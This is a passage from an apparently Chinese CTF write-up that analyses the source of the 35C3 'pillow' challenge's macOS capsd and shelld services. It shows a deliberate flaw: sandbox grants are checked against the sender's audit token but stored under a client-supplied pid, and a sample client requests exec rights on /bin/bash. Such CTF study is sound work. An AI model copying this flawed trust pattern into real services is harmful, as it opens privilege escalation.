<span class="number">0</span>) != <span class="number">0</span> &amp;&amp; errno == ESRCH) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建一个 CFNumber 类型的 key 值引用，且该值初始化为传入的 pid</span></span><br><span class="line">    CFNumberRef key = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &amp;pid);</span><br><span class="line">    <span class="comment">// 创建一个 CF 字典类型的引用，注意这只是一个引用</span></span><br><span class="line">    CFMutableDictionaryRef capabilities;</span><br><span class="line">    <span class="comment">/* 判断：这个 key 值是否已经在 capabilities_by_pid 字典中了（即先前是否已经添加过该 pid 了）</span></span><br><span class="line"><span class="comment">       如果存在，则将该 key 值所对应的 value （也是一个字典类型的值）的引用存入 capabilities 变量中 */</span></span><br><span class="line">    <span class="keyword">if</span> (!CFDictionaryGetValueIfPresent(capabilities_by_pid, key, (<span class="keyword">const</span> <span class="keyword">void</span>**)&amp;capabilities)) &#123;</span><br><span class="line">        <span class="comment">// 如果发现该 pid 不存在与全局字典中，则手动建立一个 value</span></span><br><span class="line">        capabilities = CFDictionaryCreateMutable(kCFAllocatorDefault, <span class="number">0</span>, &amp;kCFTypeDictionaryKeyCallBacks, &amp;kCFTypeDictionaryValueCallBacks);</span><br><span class="line">        <span class="comment">// 并将该 key value 键值对存入全局字典里</span></span><br><span class="line">        CFDictionaryAddValue(capabilities_by_pid, key, capabilities);</span><br><span class="line">        CFRelease(capabilities);</span><br><span class="line">        <span class="comment">// 这里稍微有点难懂，不过整体的意思是，注册一个 handler，当子进程退出时，自动释放那些存入的键值对</span></span><br><span class="line">        <span class="keyword">dispatch_source_t</span> source = dispatch_source_create(DISPATCH_SOURCE_TYPE_PROC, pid, DISPATCH_PROC_EXIT, dispatch_get_main_queue());</span><br><span class="line">        dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">            os_log(OS_LOG_DEFAULT, <span class="string">"cleaning up capabilities for dead client %d"</span>, pid);</span><br><span class="line"></span><br><span class="line">            CFDictionaryRemoveValue(capabilities_by_pid, key);</span><br><span class="line"></span><br><span class="line">            CFRelease(key);</span><br><span class="line"></span><br><span class="line">            dispatch_source_cancel(source);</span><br><span class="line">            dispatch_release(source);</span><br><span class="line">        &#125;);</span><br><span class="line">        dispatch_resume(source);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果有，则无事发生，将取出来对应于该 pid 的 capabilities 字典返回给调用者</span></span><br><span class="line">        CFRelease(key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 总而言之，这里一定会返回一个全局字典中对应于传入 key 值的一个 value 字典</span></span><br><span class="line">    <span class="keyword">return</span> capabilities;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>初始时，该函数将判断<strong>传入的 pid 所在进程是否仍然存活</strong>。如果目标进程已经死亡，则没意义再创建一个 capability 字典了。</p>
+<blockquote>
+<p>向某个进程发送 <strong>0 号信号</strong>时，<strong>不会发送任何信号</strong>，但是会进行错误检查。</p>
+<p>这里的 ESRCH 是 <strong>进程不存在</strong>的错误代码。如果指定 pid 不存在则 kill -0 将会返回 ESRCH。</p>
+</blockquote>
+<p>如果存活，则判断<strong>全局字典中是否存在目标 pid 的键值对</strong>。如果存在则将其 value <strong>引用</strong>返回给调用者，否则新建一个**(pid, capabilities)键值对**，并将其插入至全局字典中，最后返回 value 的<strong>引用</strong>。</p>
+<h5 id="4-grant-capability-internal-函数">4) grant_capability_internal 函数</h5>
+<p>grant_capability_internal 函数应该算是整个 capsd 的核心函数，不过代码也很短：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">grant_capability_internal</span><span class="params">(<span class="keyword">audit_token_t</span> token, <span class="keyword">pid_t</span> target, <span class="keyword">const</span> <span class="keyword">char</span>* op, <span class="keyword">const</span> <span class="keyword">char</span>* arg)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 向 sandbox 请求 token 所对应进程中，指定 op 和 arg 所请求的权限</span></span><br><span class="line">    <span class="keyword">if</span> (sandbox_check_by_audit_token(token, op, SANDBOX_CHECK_NO_REPORT, arg, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 权限请求成功，则获取或创建一个对应于传入 pid 的 capabilities 字典</span></span><br><span class="line">        CFMutableDictionaryRef capabilities = get_or_create_capabilities_for_pid(target);</span><br><span class="line">        <span class="keyword">if</span> (!capabilities)</span><br><span class="line">            <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line">        <span class="comment">// 将传入的 op 和 arg 全转换成 CFStringRef 形式</span></span><br><span class="line">        CFStringRef operation = CFStringCreateWithCString(kCFAllocatorDefault, op, kCFStringEncodingASCII);</span><br><span class="line">        CFStringRef argument = CFStringCreateWithCString(kCFAllocatorDefault, arg, kCFStringEncodingASCII);</span><br><span class="line">        <span class="comment">// 尝试获取 capabilities 中，键 operation 对应的值 arguments 集合</span></span><br><span class="line">        CFMutableSetRef arguments;</span><br><span class="line">        <span class="keyword">if</span> (!CFDictionaryGetValueIfPresent(capabilities, operation, (<span class="keyword">const</span> <span class="keyword">void</span>**)&amp;arguments)) &#123;</span><br><span class="line">            <span class="comment">// 如果没有，则新建一个 arguments 集合，并将其插入进 capabilities中</span></span><br><span class="line">            arguments = CFSetCreateMutable(kCFAllocatorDefault, <span class="number">0</span>, &amp;kCFTypeSetCallBacks);</span><br><span class="line">            CFDictionaryAddValue(capabilities, operation, arguments);</span><br><span class="line">            CFRelease(arguments);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将新的 arguments 插入进 capabilities 里 operation 键所对应的 arguments 集合中</span></span><br><span class="line">        CFSetSetValue(arguments, argument);</span><br><span class="line"></span><br><span class="line">        CFRelease(operation);</span><br><span class="line">        CFRelease(argument);</span><br><span class="line">        <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这里，我们已经可以理清所有使用到的数据结构：</p>
+<ul>
+<li>
+<p>Server 接收到的 XPC 消息结构</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"action"</span> : ACTION_GRANT_CAPABILITY / ACTION_HAS_CAPABILITY,</span><br><span class="line">    <span class="attr">"operation"</span> : <span class="string">"str type operation"</span>,</span><br><span class="line">    <span class="attr">"argument"</span> : <span class="string">"str type argument"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>Server 返回的信息结构</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span> : <span class="number">0</span>/<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>全局字典 <code>capabilities_by_pid</code> 结构：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    pid_1 : [</span><br><span class="line">        operation_1 : [</span><br><span class="line">          argument_1，</span><br><span class="line">          argument_2，</span><br><span class="line">          ...</span><br><span class="line">      ],</span><br><span class="line">      operation_2 : [</span><br><span class="line">          argument_1，</span><br><span class="line">          argument_2，</span><br><span class="line">          ...</span><br><span class="line">      ],</span><br><span class="line">      ...</span><br><span class="line">    ],</span><br><span class="line">    pid_2 : [</span><br><span class="line">        operation_1 : [</span><br><span class="line">          argument_1，</span><br><span class="line">          argument_2，</span><br><span class="line">          ...</span><br><span class="line">      ],</span><br><span class="line">      operation_2 : [</span><br><span class="line">          argument_1，</span><br><span class="line">          argument_2，</span><br><span class="line">          ...</span><br><span class="line">      ],</span><br><span class="line">      ...</span><br><span class="line">    ],</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>不过这不是重点。注意到 <code>sandbox_check_by_audit_token</code> 函数的第一个参数 token 是由 grant_capability_internal 函数传入的：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">grant_capability_internal</span><span class="params">(<span class="keyword">audit_token_t</span> token, <span class="keyword">pid_t</span> target, <span class="keyword">const</span> <span class="keyword">char</span>* op, <span class="keyword">const</span> <span class="keyword">char</span>* arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sandbox_check_by_audit_token(token, op, SANDBOX_CHECK_NO_REPORT, arg, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而 grant_capability_internal 函数的第一个参数，是直接与<strong>信息发送方</strong>挂钩：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">audit_token_t</span> creds;</span><br><span class="line"><span class="comment">// TODO check xpc_dictionary_set_audit_token</span></span><br><span class="line">xpc_dictionary_get_audit_token(msg, &amp;creds);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (...) &#123;</span><br><span class="line">    xpc_dictionary_set_bool(reply, <span class="string">"success"</span>, grant_capability_internal(creds, ...) == KERN_SUCCESS);</span><br><span class="line">&#125; </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>因此，传入 grant_capability_internal 函数的 pid，<strong>只是起到了一个键的作用</strong>，真正用于判断 sandbox 的则是 <strong>audit token</strong>。正常情况下消息发送者的 pid 理应和发送请求中的 pid 相同（即发送者应该发送自己的 PID 给 service）。</p>
+<p>最后再说明一下<code>sandbox_check_by_audit_token</code> 函数，这个函数几乎没有任何说明文档可供查阅：</p>
+<ul>
+<li>
+<p>作用：<strong>检查某些操作是否允许在沙箱返回内执行</strong>，如果允许则返回 <strong>0</strong>，即 <code>DECISION_ALLOW</code>。</p>
+</li>
+<li>
+<p>函数定义：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> SANDBOX_CHECK_NO_REPORT;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sandbox_check_by_audit_token</span><span class="params">(<span class="keyword">audit_token_t</span> token, <span class="keyword">const</span> <span class="keyword">char</span>* operation, <span class="keyword">int</span> flags, ...)</span></span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>函数参数：</p>
+<ul>
+<li>通常 flags 为 <code>SANDBOX_CHECK_NO_REPORT</code>，这表示以<strong>静默方式</strong>检查沙箱权限，不输出任何信息</li>
+</ul>
+</li>
+<li>
+<p>operation 指向一个 <strong>沙箱权限规则字符串</strong>（类似scheme的语言，因此 scheme 语法很有用），我们可以在 <a href="https://wiki.mozilla.org/Sandbox/OS_X_Rule_Set" target="_blank" rel="noopener">OSX Sandbox Rule Set</a> 中获得更多有用的沙箱权限规则描述示例。</p>
+<ul>
+<li>flags 后面 <code>var_args</code> 参数中的内容与 <code>operation</code>相关，例如：</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mach-lookup com.apple....</span></span><br><span class="line"><span class="keyword">int</span> port_denied = sandbox_check(pid, <span class="string">"mach-lookup"</span>, SANDBOX_CHECK_NO_REPORT, <span class="string">"com.apple...."</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// file-read-data path/to/file</span></span><br><span class="line"><span class="keyword">int</span> read_denied = sandbox_check(pid, <span class="string">"file-read-data"</span>, SANDBOX_CHECK_NO_REPORT, <span class="string">"path/to/file"</span>);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="c-client-c">c. client.c</h4>
+<p>client 执行的操作很简单，此处略过说明：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 与 capsd 建立 xpc 连接</span></span><br><span class="line">    <span class="keyword">xpc_connection_t</span> connection = xpc_connection_create_mach_service(<span class="string">"net.saelo.capsd.xpc"</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    xpc_connection_set_event_handler(connection, ^(<span class="keyword">xpc_object_t</span> event) &#123;</span><br><span class="line">    &#125;);</span><br><span class="line">    xpc_connection_resume(connection);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Enter pid:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;pid);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Adding capability 'process-exec*' for resource '/bin/bash' to process %d\n"</span>, pid);</span><br><span class="line">    <span class="comment">// 创建 XPC 消息字典</span></span><br><span class="line">    <span class="keyword">xpc_object_t</span> msg = xpc_dictionary_create(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    xpc_dictionary_set_uint64(msg, <span class="string">"action"</span>, ACTION_GRANT_CAPABILITY);</span><br><span class="line">    xpc_dictionary_set_int64(msg, <span class="string">"pid"</span>, pid);</span><br><span class="line">    xpc_dictionary_set_string(msg, <span class="string">"operation"</span>, <span class="string">"process-exec*"</span>);</span><br><span class="line">    xpc_dictionary_set_string(msg, <span class="string">"argument"</span>, <span class="string">"/bin/bash"</span>);</span><br><span class="line">    <span class="comment">// 发送并等待 server 的返回信息</span></span><br><span class="line">    <span class="keyword">xpc_object_t</span> reply = xpc_connection_send_message_with_reply_sync(connection, msg);</span><br><span class="line">    <span class="comment">// 将返回信息输出</span></span><br><span class="line">    <span class="keyword">char</span>* description = xpc_copy_description(reply);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Reply: %s\n"</span>, description);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行效果：</p>
+<p><img src="/2022/01/35c3ctf_pillow/image-20220108135557134.png" alt="image-20220108135557134"></p>
+<h4 id="d-功能">d. 功能</h4>
+<p>综合上面的代码，我们可以了解到，capsd 对 mach IPC 和 XPC 都提供了两个接口 <code>grand_capability</code> 和 <code>has_capability</code>。</p>
+<p>其中， <code>grand_capability</code> 函数会判断<strong>消息发送方</strong>请求的沙箱权限是否被允许，如果是，则将其添加进<strong>全局字典</strong>中。</p>
+<blockquote>
+<p>grand 操作就指的是将请求的 op 和 args 添加进全局字典的这个操作，而并非实际分配了一个新权限。</p>
+</blockquote>
+<p>若下一次有请求判断某个 pid 是否有特定的沙箱权限时（<code>has_capability</code>），capsd 只会检查全局字典中是否有先前所保存的 op 和 args，并根据检查结果返回。</p>
+<p>接下来我们再看看 shelld。</p>
+<h3 id="2-shelld">2. shelld</h3>
+<h4 id="a-shelld-defs">a. shelld.defs</h4>
+<p>这里定义了4个接口，分别是 <code>shelld_create_session</code> 、 <code>shell_exec</code>、<code>register_completion_listener</code> 和 <code>unregister_completion_listener</code>。接口具体用法后面再说，干看 defs 也看不出来。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">subsystem shelld <span class="number">133700</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/std_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach_debug/mach_debug_types.defs&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"../common/types.h"</span>;</span><br><span class="line"></span><br><span class="line">type <span class="built_in">string</span> = c_string[*:<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">routine <span class="title">shelld_create_session</span><span class="params">(server: <span class="keyword">mach_port_t</span>; name: <span class="built_in">string</span>; ServerAuditToken token: <span class="keyword">audit_token_t</span>)</span></span>;</span><br><span class="line"><span class="function">routine <span class="title">shell_exec</span><span class="params">(server: <span class="keyword">mach_port_t</span>; session: <span class="built_in">string</span>; command: <span class="built_in">string</span>; ServerAuditToken token: <span class="keyword">audit_token_t</span>)</span></span>;</span><br><span class="line"><span class="function">routine <span class="title">register_completion_listener</span><span class="params">(server: <span class="keyword">mach_port_t</span>; session: <span class="built_in">string</span>; listener: <span class="keyword">mach_port_t</span>; ServerAuditToken token: <span class="keyword">audit_token_t</span>)</span></span>;</span><br><span class="line"><span class="function">routine <span class="title">unregister_completion_listener</span><span class="params">(server: <span class="keyword">mach_port_t</span>; session: <span class="built_in">string</span>; ServerAuditToken token: <span class="keyword">audit_token_t</span>)</span></span>;</span><br></pre></td></tr></table></figure>
+<h4 id="b-shelld-client-defs">b. shelld_client.defs</h4>
+<p>定义了接口 <code>shelld_client_notify</code>，目测可能是 Server 用于通知 Client 的。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">subsystem shelld_client <span class="number">133800</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/std_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach_debug/mach_debug_types.defs&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"../common/types.h"</span>;</span><br><span class="line"></span><br><span class="line">type <span class="built_in">string</span> = c_string[*:<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">routine <span class="title">shelld_client_notify</span><span class="params">(listener: <span class="keyword">mach_port_t</span>; status: <span class="keyword">int</span>; output: <span class="built_in">string</span>)</span></span>;</span><br></pre></td></tr></table></figure>
+<h4 id="c-shelld-c">c. shelld.c</h4>
+<h5 id="1-shelld-main-函数">1) shelld main 函数</h5>
+<p>main 函数做了以下几件事情：</p>
+<ol>
+<li>创建了一个<strong>全局字典 <code>sessions</code></strong>。</li>
+<li>创建一个权限为 rwxrwxrwx 的文件夹 <code>/private/tmp/shelld</code>。</li>
+<li>从 bootstrap 中获取到 capsd 所注册的 mach port，同时将自己的 mach port 注册进 bootstrap 中。</li>
+<li>为自己的 mach port 设置 MIG 的处理例程。</li>
+</ol>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr;</span><br><span class="line">    <span class="keyword">mach_port_t</span> bootstrap_port, service_port;</span><br><span class="line"></span><br><span class="line">    sessions = CFDictionaryCreateMutable(kCFAllocatorDefault, <span class="number">0</span>, &amp;kCFTypeDictionaryKeyCallBacks, &amp;kCFTypeDictionaryValueCallBacks);</span><br><span class="line"></span><br><span class="line">    mkdir(<span class="string">"/private/tmp/shelld"</span>, <span class="number">0777</span>);</span><br><span class="line"></span><br><span class="line">    task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &amp;bootstrap_port);</span><br><span class="line"></span><br><span class="line">    kr = bootstrap_look_up(bootstrap_port, <span class="string">"net.saelo.capsd"</span>, &amp;capsd_service_port);</span><br><span class="line">    ASSERT_KERN_SUCCESS(kr, <span class="string">"bootstrap_look_up"</span>);</span><br><span class="line"></span><br><span class="line">    kr = bootstrap_check_in(bootstrap_port, <span class="string">"net.saelo.shelld"</span>, &amp;service_port);</span><br><span class="line">    ASSERT_KERN_SUCCESS(kr, <span class="string">"bootstrap_check_in"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">dispatch_source_t</span> source = dispatch_source_create(DISPATCH_SOURCE_TYPE_MACH_RECV, service_port, <span class="number">0</span>, dispatch_get_main_queue());</span><br><span class="line"></span><br><span class="line">    dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">        dispatch_mig_server(source, MAX_MSG_SIZE, shelld_server);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    dispatch_resume(source);</span><br><span class="line">    dispatch_main();</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="2-register-completion-listener-函数">2) register_completion_listener 函数</h5>
+<p>该函数的作用比较简单，初始时将 sessions 全局字典中找出<strong>符合 session_name 和 client</strong> 的字典，并将传入的 listener 的 mach port 存入进去。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">register_completion_listener</span><span class="params">(<span class="keyword">mach_port_t</span> server, <span class="keyword">const</span> <span class="keyword">char</span>* session_name, <span class="keyword">mach_port_t</span> listener, <span class="keyword">audit_token_t</span> client)</span> </span>&#123;</span><br><span class="line">    CFMutableDictionaryRef session = lookup_session(session_name, client);</span><br><span class="line">    <span class="keyword">if</span> (!session) &#123;</span><br><span class="line">        mach_port_deallocate(mach_task_self(), listener);</span><br><span class="line">        <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CFNumberRef value = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &amp;listener);</span><br><span class="line">    CFDictionaryAddValue(session, CFSTR(<span class="string">"listener"</span>), value);</span><br><span class="line">    CFRelease(value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">CFMutableDictionaryRef <span class="title">lookup_session</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">audit_token_t</span> client)</span> </span>&#123;</span><br><span class="line">    CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, name, kCFStringEncodingASCII);</span><br><span class="line"></span><br><span class="line">    CFMutableDictionaryRef session = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (CFDictionaryGetValueIfPresent(sessions, key, (<span class="keyword">const</span> <span class="keyword">void</span>**)&amp;session)) &#123;</span><br><span class="line">        CFNumberRef cf_owner_pid = CFDictionaryGetValue(session, CFSTR(<span class="string">"pid"</span>));</span><br><span class="line">        <span class="keyword">int</span> owner_pid;</span><br><span class="line">        ASSERT(CFNumberGetValue(cf_owner_pid, kCFNumberSInt32Type, &amp;owner_pid));</span><br><span class="line">        <span class="keyword">if</span> (owner_pid != audit_token_to_pid(client))</span><br><span class="line">            session = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CFRelease(key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时可以暂时确定 sessions 字典的结构为：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"session_name1"</span> : &#123;</span><br><span class="line">        <span class="attr">"pid1"</span> : <span class="string">"xxx"</span>,</span><br><span class="line">        <span class="attr">"listener"</span> : <span class="string">"&lt;mach_port_t&gt;"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="3-unregister-completion-listener-函数">3) unregister_completion_listener 函数</h5>
+<p>其行为与 <code>register_completion_listener</code> 相反，将 listener mach port 从 sessions 中移出。</p>
